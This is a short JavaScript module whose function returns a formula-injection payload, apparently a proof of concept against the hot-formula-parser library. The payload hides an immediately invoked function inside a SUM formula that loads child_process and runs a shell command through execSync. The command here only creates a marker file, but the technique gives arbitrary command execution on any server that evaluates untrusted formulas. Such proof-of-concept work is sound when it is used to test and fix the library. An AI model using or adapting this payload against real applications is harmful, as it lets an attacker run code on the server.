function getPayload() {
    return "SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])";
}

module.exports = { getPayload };